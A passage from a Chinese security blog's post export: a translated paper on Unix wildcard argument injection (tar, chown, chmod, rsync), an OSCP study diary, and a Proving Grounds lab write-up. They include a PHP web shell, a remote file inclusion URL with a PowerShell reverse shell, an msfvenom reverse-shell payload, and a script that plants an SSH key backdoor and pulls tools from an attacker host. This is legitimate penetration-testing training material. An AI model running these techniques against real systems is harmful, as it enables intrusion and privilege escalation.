[{"title":"Wildcard Gone Wild：Unix 通配符攻击","date":"2025-09-30T09:01:02.000Z","path":"post/20250930170102.html","text":"原文：https://www.exploit-db.com/papers/33930作者：- Leon Juranic &#x6c;&#101;&#x6f;&#x6e;&#x40;&#100;&#101;&#x66;&#x65;&#x6e;&#115;&#101;&#99;&#x6f;&#x64;&#101;&#x2e;&#x63;&#111;&#x6d;创建日期：2013&#x2F;04&#x2F;20发布日期：2014&#x2F;06&#x2F;25 引言首先，这篇文章没有像ASLR绕过、POP利用、0day远程内核漏洞或者Chrome上那种需要”串14个不同的bug才能到达目标”的现代黑客技术。本文要介绍的是一种有趣的老派的Unix黑客技巧，直到2013年仍然有效。让我惊讶的是很多安全从业者都没有听说过这种技巧。可能是此前没人正式讨论过它。 我决定写本文的原因很简单：就我个人而言，仅凭一些简单的Unix通配符投毒就能完成一些目的很有趣。因此，你也可以吧本文当作一组精巧的 *nix黑客技巧合集，据我所知，它们之前还没有被系统呈现过。 如果你想知道如何使用tar或者chown这样基础的Unix工具完全攻陷系统，请继续读下去。请坐稳、系好安全带，我们要一路回到80年代，直抵Unix Shell黑客世界。（背景里是不是响起了那种糟糕发型摇滚&#x2F;律动迪斯科？我想是的……） Unix通配符如果你已经知道了什么是Unix通配符，以及它们是如何在shell脚本中使用的，可以跳过本节。 通配符是一个字符或者一组字符，用于替代某个范围&#x2F;类别的字符，在执行其他动作之前，通配符由shell解释。一些常见的通配符： * 星号匹配文件名中的任意数量字符（包括零个）。 ? 问号匹配任意单个字符。 [ ] 方括号包裹一个字符集合，其中任意一个字符都可以在该位置匹配。 - 在方括号内使用连字符表示一个范围。 ~ 位于单词开头时展开为你的主目录。若其后接上其他用户的登录名，则表示该用户的主目录。通配符的基本使用示例:1234567891011ls *.php 列出所有以 .php 结尾的文件rm *.gz删除所有 GZIP 文件cat backup*显示所有以 backup 开头的文件内容ls test?列出所有以 test 开头且恰好再多一个字符的文件 通配符Wilderness顾名思义，通配符天生就是狂野的(wild),在某些场景中他们甚至会失控(go berserk)。在最初玩这些有趣的通配符技巧时，我和一些老派的(old school) Unix管理员以及安全从业者交流，看看他们当中有多少人了解这些技巧以及潜在的危险。令我惊讶的是20个人里面只有2个人表示知道：在使用通配符时，特别是rm命令时，要格外谨慎，因为有人可能会利用”看起来像是参数的文件名（argument-like-filename)”。 其中一位说他多年前在某个基础的Linux管理课程里听说过此事。 这个技巧背后的原理很简单：当使用shell通配符时，尤其是*（asterisk）时，Unix shell会把以-(hyphen) 开头的文件名解析为要执行的命令&#x2F;程序的命令行参数。这就给经典的”通道混淆（channeling）”攻击留下来空间。 当不同的信息通道被混合到同一个通道时，就会出现”通道混淆”问题。本文中具体场景，就是因为通配符的使用把”参数”和”文件名”这两个不同的”通道”混淆了。下面看一个非常基础的”通配符导致参数注入”的例子。 1234567891011[root@defensecode public]# ls -altotal 20drwxrwxr-x. 5 leon leon 4096 Oct 28 17:04 .drwx------. 22 leon leon 4096 Oct 28 16:15 ..drwxrwxr-x. 2 leon leon 4096 Oct 28 17:04 DIR1drwxrwxr-x. 2 leon leon 4096 Oct 28 17:04 DIR2drwxrwxr-x. 2 leon leon 4096 Oct 28 17:04 DIR3-rw-rw-r--. 1 leon leon 0 Oct 28 17:03 file1.txt-rw-rw-r--. 1 leon leon 0 Oct 28 17:03 file2.txt-rw-rw-r--. 1 leon leon 0 Oct 28 17:03 file3.txt-rw-rw-r--. 1 nobody nobody 0 Oct 28 16:38 -rf 有一个名为-rf的文件，它的所有者是nobody，现在我们运行rm *再来看看目录内容： 123456[root@defensecode public]# rm *[root@defensecode public]# ls -altotal 8drwxrwxr-x. 2 leon leon 4096 Oct 28 17:05 .drwx------. 22 leon leon 4096 Oct 28 16:15 ..-rw-rw-r--. 1 nobody nobody 0 Oct 28 16:38 -rf 目录被清空了，只剩下-rf这个文件，所有文件和目录都被递归删除。当我们用*作为参数执行rm时，当前目录下的所有文件名都会作为命令行参数传递给rm，等价于 1rm DIR1 DIR2 DIR3 file1.txt file2.txt file3.txt -rf 因为当前目录里有一个名为-rf 的文件，rm 把它当成了选项（-rf）放在了最后，于是把所有东西都递归地删了。我们用 strace 也能看到这一点： 1234[leon@defensecode WILD]$ strace rm *execve(&quot;/bin/rm&quot;, [&quot;rm&quot;, &quot;DIR1&quot;, &quot;DIR2&quot;, &quot;DIR3&quot;, &quot;file1.txt&quot;, &quot;file2.txt&quot;,&quot;file3.txt&quot;, &quot;-rf&quot;], [/* 25 vars */]) = 0 ^- 就在这里 现在我们知道了，为什么可以向 Unix 程序注入任意参数。下一节会讲讲如何滥用这个“特性”，做的不仅仅是“递归删文件”。 更有用的东西既然我们已经知道如何向shell命令注入任意参数，那就来演示几个比”递归删除文件”更有用的例子。最初我玩到这个通配符技巧后，就开始寻找一些常见的、基础的Unix程序，看它们在接收到意外参数时，会不会收到严重影响。在真是世界中，下面这些例子既可以在交互式shell里执行，也可以通过定时任务(cron)、shell脚本、web应用触发的命令等路径被滥用。一下的示例里，攻击者都用lemon 账号，受害者是root chown的文件引用利用技巧（文件所有者劫持）第一个有趣的目标是chown假设我们有一个可公开写入的目录，里面一堆文件，root想把所有php文件属主改为nobody,请注意下面文件列表中的所有者： 12345678910111213141516171819[root@defensecode public]# ls -altotal 52drwxrwxrwx. 2 user user 4096 Oct 28 17:47 .drwx------. 22 user user 4096 Oct 28 17:34 ..-rw-rw-r--. 1 user user 66 Oct 28 17:36 admin.php-rw-rw-r--. 1 user user 34 Oct 28 17:35 ado.php-rw-rw-r--. 1 user user 80 Oct 28 17:44 config.php-rw-rw-r--. 1 user user 187 Oct 28 17:44 db.php-rw-rw-r--. 1 user user 201 Oct 28 17:35 download.php-rw-r--r--. 1 leon leon 0 Oct 28 17:40 .drf.php-rw-rw-r--. 1 user user 43 Oct 28 17:35 file1.php-rw-rw-r--. 1 user user 56 Oct 28 17:47 footer.php-rw-rw-r--. 1 user user 357 Oct 28 17:36 global.php-rw-rw-r--. 1 user user 225 Oct 28 17:35 header.php-rw-rw-r--. 1 user user 117 Oct 28 17:36 inc.php-rw-rw-r--. 1 user user 111 Oct 28 17:38 index.php-rw-rw-r--. 1 leon leon 0 Oct 28 17:45 --reference=.drf.php-rw-rw----. 1 user user 66 Oct 28 17:35 password.inc.php-rw-rw-r--. 1 user user 94 Oct 28 17:35 script.php 这些公共目录里的文件大多归 user 所有，root 现在要把它们改为 nobody： 1[root@defensecode public]# chown -R nobody:nobody *.php 执行之后，再看一眼文件的所有者： 12345678910111213141516171819[root@defensecode public]# ls -altotal 52drwxrwxrwx. 2 user user 4096 Oct 28 17:47 .drwx------. 22 user user 4096 Oct 28 17:34 ..-rw-rw-r--. 1 leon leon 66 Oct 28 17:36 admin.php-rw-rw-r--. 1 leon leon 34 Oct 28 17:35 ado.php-rw-rw-r--. 1 leon leon 80 Oct 28 17:44 config.php-rw-rw-r--. 1 leon leon 187 Oct 28 17:44 db.php-rw-rw-r--. 1 leon leon 201 Oct 28 17:35 download.php-rw-r--r--. 1 leon leon 0 Oct 28 17:40 .drf.php-rw-rw-r--. 1 leon leon 43 Oct 28 17:35 file1.php-rw-rw-r--. 1 leon leon 56 Oct 28 17:47 footer.php-rw-rw-r--. 1 leon leon 357 Oct 28 17:36 global.php-rw-rw-r--. 1 leon leon 225 Oct 28 17:35 header.php-rw-rw-r--. 1 leon leon 117 Oct 28 17:36 inc.php-rw-rw-r--. 1 leon leon 111 Oct 28 17:38 index.php-rw-rw-r--. 1 leon leon 0 Oct 28 17:45 --reference=.drf.php-rw-rw----. 1 leon leon 66 Oct 28 17:35 password.inc.php-rw-rw-r--. 1 leon leon 94 Oct 28 17:35 script.php 超级用户明明想把属主改成 nobody:nobody，结果所有文件都变成 leon 拥有了。仔细看，这个目录里来自 leon 的文件只有这两个 12-rw-r--r--. 1 leon leon 0 Oct 28 17:40 .drf.php-rw-rw-r--. 1 leon leon 0 Oct 28 17:45 --reference=.drf.php 问题在于：chown 命令行里使用了通配符，于是任意的 --reference=.drf.php 这个文件名被当成选项传给了 chown。看 chown 的手册（man chown）： 12--reference=RFILE use RFILE&#x27;s owner and group rather than specifying OWNER:GROUP values 也就是说，--reference 选项会覆盖命令中指定的 nobody:nobody，把目标文件的属主&#x2F;属组改成参考文件 .drf.php 的属主&#x2F;属组，而 .drf.php 是 leon 的。顺带一提，.drf 是 Dummy Reference File（虚拟参考文件） 的缩写 :） 总结一下：通过 --reference，我们可以把文件的所有权改成任意用户。如果把 --reference 指向另一个用户拥有的某个文件，那这个用户就会成为当前目录所有文件的拥有者。借助这种 chown 参数污染，我们可以诱使 root 把文件改属为任意用户，实际上完成“文件劫持”。更进一步，如果 leon 事先在该目录里创建了一个符号链接指向 /etc/shadow，那么 /etc/shadow 的所有权也会被改成 leon。 chown的文件引用利用技巧与上面的 chown 攻击类似，chmod 同样有 --reference 选项，可以被滥用来对由星号通配选中的文件设置任意权限。chmod 手册（man chmod）： 12--reference=RFILE use RFILE&#x27;s mode instead of MODE values 示例: 1234567891011121314151617[root@defensecode public]# ls -altotal 68drwxrwxrwx. 2 user user 4096 Oct 29 00:41 .drwx------. 24 user user 4096 Oct 28 18:32 ..-rw-rw-r--. 1 user user 20480 Oct 28 19:13 admin.php-rw-rw-r--. 1 user user 34 Oct 28 17:47 ado.php-rw-rw-r--. 1 user user 187 Oct 28 17:44 db.php-rw-rw-r--. 1 user user 201 Oct 28 17:43 download.php-rwxrwxrwx. 1 leon leon 0 Oct 29 00:40 .drf.php-rw-rw-r--. 1 user user 43 Oct 28 17:35 file1.php-rw-rw-r--. 1 user user 56 Oct 28 17:47 footer.php-rw-rw-r--. 1 user user 357 Oct 28 17:36 global.php-rw-rw-r--. 1 user user 225 Oct 28 17:37 header.php-rw-rw-r--. 1 user user 117 Oct 28 17:36 inc.php-rw-rw-r--. 1 user user 111 Oct 28 17:38 index.php-rw-r--r--. 1 leon leon 0 Oct 29 00:41 --reference=.drf.php-rw-rw-r--. 1 user user 94 Oct 28 17:38 script.php root用户现在尝试把所有文件的权限设为 000： 1chmod 000 * 再看看权限： 1234567891011121314151617[root@defensecode public]# ls -altotal 68drwxrwxrwx. 2 user user 4096 Oct 29 00:41 .drwx------. 24 user user 4096 Oct 28 18:32 ..-rwxrwxrwx. 1 user user 20480 Oct 28 19:13 admin.php-rwxrwxrwx. 1 user user 34 Oct 28 17:47 ado.php-rwxrwxrwx. 1 user user 187 Oct 28 17:44 db.php-rwxrwxrwx. 1 user user 201 Oct 28 17:43 download.php-rwxrwxrwx. 1 leon leon 0 Oct 29 00:40 .drf.php-rwxrwxrwx. 1 user user 43 Oct 28 17:35 file1.php-rwxrwxrwx. 1 user user 56 Oct 28 17:47 footer.php-rwxrwxrwx. 1 user user 357 Oct 28 17:36 global.php-rwxrwxrwx. 1 user user 225 Oct 28 17:37 header.php-rwxrwxrwx. 1 user user 117 Oct 28 17:36 inc.php-rwxrwxrwx. 1 user user 111 Oct 28 17:38 index.php-rw-r--r--. 1 leon leon 0 Oct 29 00:41 --reference=.drf.php-rwxrwxrwx. 1 user user 94 Oct 28 17:38 script.php 发生了什么？本来应该是 000，结果所有文件都成了 777，因为通过文件名注入了 --reference 选项。再次说明：leon 拥有的 .drf.php 的权限是 777，被用作参考文件；既然提供了 --reference，那么所有文件都会被设为 777。除了 --reference，攻击者还可以再造一个文件名为 -R 的文件，从而让 chmod 对子目录中的文件也递归地修改权限。 tar任意命令执行上面的例子很好地说明了“所有权劫持”。现在我们来看更有意思的：任意命令执行。tar 是非常常见的 Unix 程序，用于创建与解压归档。创建归档的常见用法： 1tar cvvf archive.tar * 那么 tar 有什么问题？问题在于 tar 的选项很多，其中从“任意参数注入”的角度看，有些选项非常有意思。看 tar 手册（man tar）： 12345--checkpoint[=NUMBER] display progress messages every NUMBERth record (default 10) --checkpoint-action=ACTION execute ACTION on each checkpoint 这里的 --checkpoint-action 可以指定在每次到达检查点时执行的程序。本质上，这就允许我们执行任意命令。看下面的目录： 123456789101112131415161718[root@defensecode public]# ls -altotal 72drwxrwxrwx. 2 user user 4096 Oct 28 19:34 .drwx------. 24 user user 4096 Oct 28 18:32 ..-rw-rw-r--. 1 user user 20480 Oct 28 19:13 admin.php-rw-rw-r--. 1 user user 34 Oct 28 17:47 ado.php-rw-r--r--. 1 leon leon 0 Oct 28 19:19 --checkpoint=1-rw-r--r--. 1 leon leon 0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh-rw-rw-r--. 1 user user 187 Oct 28 17:44 db.php-rw-rw-r--. 1 user user 201 Oct 28 17:43 download.php-rw-rw-r--. 1 user user 43 Oct 28 17:35 file1.php-rw-rw-r--. 1 user user 56 Oct 28 17:47 footer.php-rw-rw-r--. 1 user user 357 Oct 28 17:36 global.php-rw-rw-r--. 1 user user 225 Oct 28 17:37 header.php-rw-rw-r--. 1 user user 117 Oct 28 17:36 inc.php-rw-rw-r--. 1 user user 111 Oct 28 17:38 index.php-rw-rw-r--. 1 user user 94 Oct 28 17:38 script.php-rwxr-xr-x. 1 leon leon 12 Oct 28 19:17 shell.sh 现在，root 要把当前目录里的所有文件打包 1tar cf archive.tar * 输出： 1234uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 发生了什么？/usr/bin/id 被执行了！我们刚刚在 root 权限下实现了任意命令执行。再看这些由 leon 创建的文件 123-rw-r--r--. 1 leon leon 0 Oct 28 19:19 --checkpoint=1-rw-r--r--. 1 leon leon 0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh-rwxr-xr-x. 1 leon leon 12 Oct 28 19:17 shell.sh --checkpoint=1 与 --checkpoint-action=exec=sh shell.sh 被当作命令行选项传给 tar。它们让 tar 在达到检查点时执行 shell.sh： 12[root@defensecode public]# cat shell.sh/usr/bin/id 因此，通过这种 tar 参数污染，我们基本上可以以运行 tar 的用户的权限执行任意命令。 rsync任意命令执行rsync 是“一个快速、多功能的远程（也可本地）文件复制工具”，在 Unix 系统上非常常见。看一下 rsync 的手册，我们同样能找到能被滥用来进行任意命令执行的选项。 rsync 手册摘录：“像使用 rcp 一样使用 rsync。你必须指定源和目标，其中一个可以是远端。” 几个有意思的选项： 12-e, --rsh=COMMAND 指定要使用的远程 shell --rsync-path=PROGRAM 指定在远端机器上运行的 rsync 程序 我们直接滥用一下手册里的一个例子：把本地目录里所有 *.c 文件复制到远端主机 foo 的 /src 目录。 1rsync -t *.c foo:src/ 目录内容如下： 1234567891011121314151617[root@defensecode public]# ls -altotal 72drwxrwxrwx. 2 user user 4096 Mar 28 04:47 .drwx------. 24 user user 4096 Oct 28 18:32 ..-rwxr-xr-x. 1 user user 20480 Oct 28 19:13 admin.php-rwxr-xr-x. 1 user user 34 Oct 28 17:47 ado.php-rwxr-xr-x. 1 user user 187 Oct 28 17:44 db.php-rwxr-xr-x. 1 user user 201 Oct 28 17:43 download.php-rw-r--r--. 1 leon leon 0 Mar 28 04:45 -e sh shell.c-rwxr-xr-x. 1 user user 43 Oct 28 17:35 file1.php-rwxr-xr-x. 1 user user 56 Oct 28 17:47 footer.php-rwxr-xr-x. 1 user user 357 Oct 28 17:36 global.php-rwxr-xr-x. 1 user user 225 Oct 28 17:37 header.php-rwxr-xr-x. 1 user user 117 Oct 28 17:36 inc.php-rwxr-xr-x. 1 user user 111 Oct 28 17:38 index.php-rwxr-xr-x. 1 user user 94 Oct 28 17:38 script.php-rwxr-xr-x. 1 leon leon 31 Mar 28 04:45 shell.c 现在 root 要把所有 C 文件复制到远端： 1rsync -t *.c foo:src/ 输出： 12rsync: connection unexpectedly closed (0 bytes received so far) [sender]rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8] 看看发生了什么： 123456789101112131415161718[root@defensecode public]# ls -altotal 76drwxrwxrwx. 2 user user 4096 Mar 28 04:49 .drwx------. 24 user user 4096 Oct 28 18:32 ..-rwxr-xr-x. 1 user user 20480 Oct 28 19:13 admin.php-rwxr-xr-x. 1 user user 34 Oct 28 17:47 ado.php-rwxr-xr-x. 1 user user 187 Oct 28 17:44 db.php-rwxr-xr-x. 1 user user 201 Oct 28 17:43 download.php-rw-r--r--. 1 leon leon 0 Mar 28 04:45 -e sh shell.c-rwxr-xr-x. 1 user user 43 Oct 28 17:35 file1.php-rwxr-xr-x. 1 user user 56 Oct 28 17:47 footer.php-rwxr-xr-x. 1 user user 357 Oct 28 17:36 global.php-rwxr-xr-x. 1 user user 225 Oct 28 17:37 header.php-rwxr-xr-x. 1 user user 117 Oct 28 17:36 inc.php-rwxr-xr-x. 1 user user 111 Oct 28 17:38 index.php-rwxr-xr-x. 1 user user 94 Oct 28 17:38 script.php-rwxr-xr-x. 1 leon leon 31 Mar 28 04:45 shell.c-rw-r--r--. 1 root root 101 Mar 28 04:49 shell_output.txt 目录里由 leon 拥有的两个文件是： 12-rw-r--r--. 1 leon leon 0 Mar 28 04:45 -e sh shell.c-rwxr-xr-x. 1 leon leon 31 Mar 28 04:45 shell.c 执行 rsync 之后，目录里多了一个由 root 拥有的新文件 shell_output.txt： 1-rw-r--r--. 1 root root 101 Mar 28 04:49 shell_output.txt 内容如下： 12[root@defensecode public]# cat shell_output.txtuid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 由于使用了 *.c 通配符，rsync 在命令行上得到了 -e sh shell.c 这个选项；于是 rsync 启动时执行了 shell.c。shell.c 的内容如下： 12cat shell.c /usr/bin/id &gt; shell_output.txt 结语本文讨论的技巧可以以不同形式应用到各种流行的 Unix 工具上。在真实世界的攻击里，任意 shell 选项&#x2F;参数可以被悄悄地伪装在普通文件名之间，管理员很难一眼发现。更进一步地说，如果是 cron 任务、shell 脚本或 Web 应用去调用这些 shell 命令，除此之外，可能还有更多流行的 Unix 工具会受到前述通配符攻击的影响。 感谢 Hrvoje Spoljar 和 Sec-Consult 就本文提供的一些想法。","categories":[{"name":"How It Works-临渊羡鱼","slug":"How-It-Works-临渊羡鱼","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/"},{"name":"译","slug":"How-It-Works-临渊羡鱼/译","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/%E8%AF%91/"},{"name":"tricks","slug":"How-It-Works-临渊羡鱼/译/tricks","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/%E8%AF%91/tricks/"}],"tags":[]},{"title":"OSCP认证总结","date":"2025-05-03T07:11:26.000Z","path":"post/20250503151126.html","text":"背景考试之前也看了很多师傅们考OSCP的经验，有的师傅只简单过一下课程内容和challeng lab后就能通过考试，有些师傅考了几次都没有过。是否能通过认证考试取决于自己目前掌握知识水平和每天能在课程和Lab中花费的时间，所以不要拿自己和别人比较，我们也没法复制别人的学习路线。 我的本职工作是后端开发，因为对安全比较感兴趣，之前零散学过一些知识，现在准备转行，萌生了考个证书作为敲门砖的想法，最初准备考CISP-PTE，在了解OSCP之后，发现差不多的价钱OSCP更有含金量。本文内容请基于我已掌握了以下知识来阅读： 熟练使用linux 掌握Python、Go、PHP语言 英文阅读能力尚可，毕竟翻译软件我是会用的同样地，以下内容只是一个刚通过OSCP考试的渗透测试初学者的经验，参考价值有限 时间线从24年10月份开始学习到25年4月初通过考试，总计花费5个月时间。2024.9底购买了offsec 90天课程+Exam package, 趁着十一假期突击学习了一波2024.10月至11月中旬，利用下班后的时间学完了课程内容，预约了元旦假期考试2024.11月中旬-2025.1，因为公司春节活动，包括周末在内每天高强度加班，期间没看课程相关内容, 期间又改了2次考试时间2024.12月底，课程过期，Challenge Lab只做过第一个Secura2025.1 购买Proving Grounds Practice，按照TjNull List开始联系Machine2025.2 又续了一个月，但是因为考试预约时间已经改了2次了，也不想继续拖下去，在元宵节前的周末参加了考试，此时总计刷了大概15台Machine, 结果毫无疑问地挂了，得了20分2025.3月初，订阅Learning Unlimited后，本着这次不过1个月后还能再来一次的想法，预约了3月底的考试2025.4.1 考试通过 Discord里的有个师傅公司有22% off, Discord里也有很多备考经验分享, 每天看看师傅们讨论也能学习到不少知识, 氛围非常友好活跃。即使问一些很初级的问题，师傅们也会耐心解答，给我的备考帮助很大，在这里感谢师傅们 为什么选择Learn Unlimitd?因为当时课程已经结束，而Challenge Lab我还没有做，如果续lab(30天)+补考的话需要$359+$249，实在是有点太贵了，并且当时有点没信心，如果考不过的话补考又需要$249。此外，我希望能继续学习其他课程，掌握更多知识，因此Learn Unlimited在当时是最佳选择。 关于课程我学到了什么 PEN-200课程给我最大的感受是它是在教学生构建自己的方法论，这点对现阶段的我来说非常适用，课程结束之后对渗透测试有了初步的完整轮廓 Windows以及AD是我此前完全不懂的内容，通过课程学习之后对这部分基础有了一定认识 英语阅读能力得到了提升，之前看到大篇幅的英文文档时，第一想法是用翻译软件翻译，但是因为有些翻译不达意，逐渐养成了能静下心来逐句阅读的好习惯 一定要做的事 课程中一定要做笔记，一方面系统梳理知识点，另一方面很多工具的常用参数记录下来，在考试时和日后工作中能快速检索。我认为笔记是能否通过考试的关键 PG Machine是最好的练习，Machine肯定做的越多越好，毕竟我们的目的不只是通过考试，而是学习积累渗透测试经验，但话说回来，TjNull列表中的Machine刷完就足以应对考试了 Drrow C play list在考试前一定要过一遍，AD思路基本可以应对考试 Challenge Lab中OSCP A&#x2F;B&#x2F;C中应该至少选择一个尝试在24小时内完成，并写一份完整的渗透测试报告（我没有写报告导致交报告时的时间很紧张） 其他重要的事 熟练使用常用工具，你肯定不想在考试时调试使用不熟练的工具，我第一次考试就是 ligolo-ng掩码写错了，导致内网转发网络不通，还找了监考帮忙确认机器是否有问题，浪费了2个小时 最终前人的经验总结，它们的背后应该都有一段血泪的经历，之前看到很多师傅说reverse shell时最好使用Machine自身开放的端口，而我此前一直用80或443没有遇到过问题，因此对此不以为意，直到我也有了一段惨痛的教训 不要过于依赖自动化信息收集工具，练习手动信息收集很重要，甚至我们可以自己写一个收集信息的脚本，关键点在于我们需要知道哪些信息是需要关注的 课程中文字内容比视频更详尽，推荐先阅读文字，如果有问题再结合视频看 如果你和我一样是新手，建议多练习使用MSF，虽然在考试中对MSF的使用有限制，但是优秀工具的熟练使用对日后渗透测试应该是必须的 每种类型的工具最好能熟练使用两个，一些固定常见操作可以写一个小脚本或者alias，考试时能节省一些时间例如： alias： ligolo=/home/kali/pentestools/Pivot/ligolo-ng/run_proxy.sh 1234subnet=$1 # like 172.16.112.0/24sudo ip tuntap add user kali mode tun ligolosudo ip link set ligolo upsudo ip route add $subnet dev ligolo 获取机器初始权限之后，从kali下载如下脚本，用来添加后门或者下载文件 1234567891011121314151617181920212223242526272829303132# /bin/bashhost=$1host=&quot;http://$host&quot;shifttools=(&quot;$@&quot;)# add id_ras.pubmkdir -p /home/`whoami`/.sshecho &#x27;ssh-rsa xxx kali@kali&#x27; &gt; /home/`whoami`/.ssh/authorized_keys# 定义工具与文件名的对应关系declare -A tool_maptool_map[&quot;nc&quot;]=&quot;nc&quot;tool_map[&quot;socat&quot;]=&quot;socat&quot;tool_map[&quot;linpeas&quot;]=&quot;linpeas_linux_amd64&quot;tool_map[&quot;pspy&quot;]=&quot;pspy64&quot;tool_map[&quot;pec.sh&quot;]=&quot;pec.sh&quot;# 遍历工具并下载for tool in &quot;$&#123;tools[@]&#125;&quot;doif [[ -n &quot;$&#123;tool_map[$tool]&#125;&quot; ]]; thenecho &quot;Downloading $&#123;tool&#125;...&quot;wget &quot;$&#123;host&#125;/linux/$&#123;tool_map[$tool]&#125;&quot; -O $toolchmod +x $toolecho &quot;Download $&#123;tool&#125; Done&quot;elseecho &quot;Unknown tool: $tool&quot;fidoneecho &quot;All Done&quot; 关于考试“技巧”得益于国内应试教育的历练，我们都有很强的应对考试的能力。既然是考试，我认为多多少少会有一些所谓”技巧”, 以下综合自己的考试经历和多位师傅们的经验分享总结： 手动枚举：考试中最重要的是枚举，比如提权时我们一般会优先使用一些自动化工具提高效率，但是有些考试机器被设置为需要手动枚举才能找到利用点，那手动枚举的关键点就是能找到 考点，在oscp中的考点就是 find something unusual,关于什么是unusual，在做过了PG Machine之后就会有明显的体会，比如一般情况下windows机器目录下有 inetput、windows、users、Program Files(X86)这几个 usual文件夹，除了这些之外就是 unusual, 如果发现像 backup、ftp或者某个程序的安装文件夹，那么基本可以确定下一步方向，在pg Machine中还遇到过有台机器中有个 windows.old。 如果在登录机器后发现了nmap工具扫描没有发现的端口，也是值得关注的 something unusual web枚举时，如果发现有员工介绍，这些名字往往可能就是username，再比如员工头像都是人像，而如果某个是卡通图片，往往也可能是关键信息，需要额外关注 reverse shell选择常见的端口(比如53、443)以及机器自身开放的端口来绕过一些可能的限制 爆破时使用字典rockyou.txt，如果没有结果使用 rules/best64.rule，如果仍没有结果，那么这台机器的”考点”基本上就不是密码爆破 通过的关键：Enumerate -&gt; Enumerate -&gt; Exploit -&gt; Enumerate -&gt; Get Creds/hashes -&gt; crackmapexec/nxc -&gt; Lateral Movement and repeat… 获取权限之后修改密码或者设置后门 netexec smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable 关于报告官方的模板是word文档，我平时一般用markdown记笔记，所以想着用很多师傅在用的OSCP-Exam-Report-Template-Markdown生成报告，但是在生成报告时遇到了一些问题，又因为我写报告的时间比较晚，临近截止时间就直接Typro导出成pdf上交了。所以报告应该是能明确说明渗透路径就行，直接参考官方模板写应该是最简单的方式。 最后别把证书看得过于重要，它虽然能在某种程度上证明我们的能力，并且本文都是在讲怎么通过认证考试，也介绍了一些关于考试的所谓”技巧”，但我认为OSCP的学习过程更重要，我们在获得认证的同时，更重要的是拥有成为能力全面的Penetratin tester的能力。反之如果这个证书没能给我们的生活工作带来任何帮助，那它就是一张废纸。","categories":[{"name":"What We Got-臭鱼烂虾","slug":"What-We-Got-臭鱼烂虾","permalink":"https://www.thiiiiink.com/categories/What-We-Got-%E8%87%AD%E9%B1%BC%E7%83%82%E8%99%BE/"},{"name":"OSCP","slug":"What-We-Got-臭鱼烂虾/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Got-%E8%87%AD%E9%B1%BC%E7%83%82%E8%99%BE/OSCP/"},{"name":"PG Lab","slug":"What-We-Got-臭鱼烂虾/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Got-%E8%87%AD%E9%B1%BC%E7%83%82%E8%99%BE/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Slort","date":"2025-03-10T18:49:35.000Z","path":"post/20250311024935.html","text":"Difficultymedium Scans8080 phpinfo点击phpinfo, 允许远程包含，能找到文件包含的话可以实现rce phpmyadmin403 only avaiable from local network 路径扫描gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.111.53:8080 -t 40 发现site、img、dashboard、xampp Foothold访问 http://192.168.111.53:8080/site/ 使用kali自带的backdoor.php文件： cp /usr/share/webshells/php/simple-backdoor.php backdoor.php 然后python 启动webserver 123456789&lt;?phpif(isset($_REQUEST[&#x27;cmd&#x27;]))&#123; echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&#x27;cmd&#x27;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die;&#125;?&gt; https://www.revshells.com/ 生成反弹shell powershell base64脚本，远程文件包含执行反弹shell命令, 接收到webshell http://192.168.111.53:8080/site/index.php?page=http://192.168.45.165/web/backdoor.php&amp;cmd=powershell%20-e... 123456rlwrap nc -nvlp 8080listening on [any] 8080 ...connect to [192.168.45.165] from (UNKNOWN) [192.168.111.53] 50011PS C:\\xampp\\htdocs\\site&gt; whoamislort\\rupert phpinfo lfi如果不能远程文件包含的话，也可以利用phpinfo实现本地包含rce, 可参考： PHP LFI abuse Escalationwinpeas收集信息，在大片的xampp有backup&#x2F;TFTP.EXE 进入&#x2F;backup文件夹下查看， info.txt中提示每5分钟执行一次，可以替换TFTP.EXE为反弹shell exe msf生成反弹shell exe： msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o TFTP.EXE 下载替换 backup/TFTP.EXE 等待片刻后，获得system shell 12345678910111213rlwrap nc -nvlp 443listening on [any] 443 ...connect to [192.168.45.165] from (UNKNOWN) [192.168.111.53] 52422Microsoft Windows [Version 10.0.19042.1387](c) Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32&gt;C:\\WINDOWS\\system32&gt;C:\\WINDOWS\\system32&gt;whoamiwhoamislort\\administrator 反思 提权手动收集信息要细致，没有发现C:\\backup文件夹，检查了public, rupert, xammp文件夹，但是却忽略了C目录，实在不应该，要细致啊 winpeas的输出中，也同样没有发现backup&#x2F;TFTP.EXE文件，这部分知识简单扫了一眼都是C:\\xampp 下面是 &#x2F;users, 一定要细致啊 在看了hits后提示find backup， 在C：下找到backup， 查看info.txt， 但是眼瞎没看到run every 5 minute，实际上我确定是我自己选择性忽略了，因为在第一次cat之后，我甚至没注意看执行的是什么命令。 为什么？把前面当做命令提示符了？ 想着先分析一下backup.txt? 看到run…认为是系统输出的信息了？ 细心是关键，或许我这么粗心不适合做渗透测试？","categories":[{"name":"What We 